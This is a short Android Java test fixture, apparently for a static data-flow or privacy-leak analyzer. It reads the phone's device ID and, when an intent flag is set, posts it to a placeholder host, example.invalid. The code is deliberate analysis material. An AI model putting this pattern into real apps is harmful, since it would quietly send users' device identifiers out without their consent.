package ai.kavach.fixture;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;

public final class FlowActivity extends Activity {
    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        TelephonyManager manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String value = manager.getDeviceId();
        if (value == null || !getIntent().getBooleanExtra("UPLOAD", false)) {
            return;
        }
        try {
            URLConnection connection = new URL("https://example.invalid/upload").openConnection();
            connection.setDoOutput(true);
            PrintWriter output = new PrintWriter(connection.getOutputStream());
            output.write(value);
            output.close();
        } catch (Exception ignored) {
            // The fixture is never executed; this only provides analyzable control/data flow.
        }
    }
}
